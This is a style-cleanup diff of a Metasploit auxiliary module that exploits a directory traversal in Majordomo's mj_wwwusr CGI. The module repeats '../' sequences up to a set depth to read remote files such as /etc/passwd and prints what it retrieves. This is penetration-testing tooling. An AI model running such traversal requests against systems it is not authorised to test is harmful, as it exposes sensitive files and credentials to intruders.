@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -34,13 +34,14 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
+        OptString.new('FILE', [ true, "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
         OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),
-        OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8]),
-      ], self.class)
+        OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8])
+      ], self.class
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     trav_strings = [
       '../',
       './.../'
@@ -53,26 +54,27 @@ class MetasploitModule < Msf::Auxiliary
     trav_strings.each do |trav|
       str = ""
       i   = 1
-      while (i <= deep)
+      while i <= deep
         str = trav * i
         payload = "#{str}#{file}"
 
         res = send_request_raw(
           {
             'method'  => 'GET',
-            'uri'     => uri + payload,
-          }, 25)
+            'uri'     => uri + payload
+          }, 25
+        )
 
         if res.nil?
           print_error("#{rhost}:#{rport} Connection timed out")
           return
         end
 
-        print_status("#{rhost}:#{rport} Trying URL " + payload )
+        print_status("#{rhost}:#{rport} Trying URL " + payload)
 
-        if (res and res.code == 200 and res.body)
-          if res.body.match(/\<html\>(.*)\<\/html\>/im)
-            html = $1
+        if res && (res.code == 200) && res.body
+          if res.body =~ /\<html\>(.*)\<\/html\>/im
+            html = Regexp.last_match(1)
 
             if res.body =~ /unknowntopic/
               print_error("#{rhost}:#{rport} Could not retrieve the file")
@@ -93,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
           # if res is nil, we hit this
           print_error("#{rhost}:#{rport} Unrecognized #{res.code} response")
         end
-        i += 1;
+        i += 1
       end
     end
 
@@ -101,5 +103,4 @@ class MetasploitModule < Msf::Auxiliary
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
   rescue ::Timeout::Error, ::Errno::EPIPE
   end
-
 end
